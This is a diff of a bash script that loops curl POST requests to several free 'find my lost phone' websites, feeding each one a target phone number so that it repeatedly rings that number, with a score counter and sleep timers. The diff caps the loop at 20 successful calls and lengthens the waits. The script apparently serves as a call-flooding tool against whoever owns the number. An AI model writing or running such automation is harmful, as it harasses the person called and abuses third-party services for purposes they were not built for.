@@ -12,7 +12,7 @@ site1var2=noNumb #possibly iNumb
 
 site2=http://www.callmylostphone.com
 site2var1=recipient #possibly iRecipient
-# the 2 variables needed are "noArea" and "noNumb" for this site
+# the 1 variable needed is "recipient"
 
 site3=http://www.icantfindmyphone.com
 site3var1=areaCode
@@ -46,7 +46,7 @@ echo "We will be calling ($areacode) $firstthree - $lastfour until I say stop"
 
 counter=0
 score=0
-while [ 1 ]
+while [ $score -lt 20  ]
 do
   echo ""
   echo "ROUND $counter! (round*2 = total calls attempted)"
@@ -67,13 +67,13 @@ do
     echo ""
     echo "Call sent, now sleeping for a bit"
     rm $junkfile
-    sleep 50
+    sleep 300
   fi
 
 
   echo "Calling from $site2."
-#  curl -s --data "$site2var1=$areacode&$site2var1=$firstthree$lastfour" $site2 > $junkfile
-  curl -s -d "$site2var1=$wholenumber" $site2 > $junkfile
+  curl -s --data "$site2var1=$areacode&$site2var1=$firstthree$lastfour" $site2 > $junkfile
+#  curl -s -d "$site2var1=$wholenumber" $site2 > $junkfile
   if [ $(cat $junkfile | wc -l) -gt 2 ]
   then
     echo "FAILED! wait longer."
@@ -85,7 +85,7 @@ do
     echo ""
     echo "Call sent, now sleeping for a bit"
     rm $junkfile
-    sleep 50
+    sleep 300
   fi
 
 #  echo "Calling from $site3."
@@ -94,14 +94,15 @@ do
 #  then
 #    echo "FAILED! wait longer."
 #    echo ""
+#    rm $junkfile
 #  else
 #    echo "SUCCESS!"
 #    let score+=1
 #    echo ""
 #    echo "Call sent, now sleeping for a bit"
+#    rm $junkfile
 #    sleep 30
 #  fi
-#  rm $junkfile
 
   let counter+=1
 done
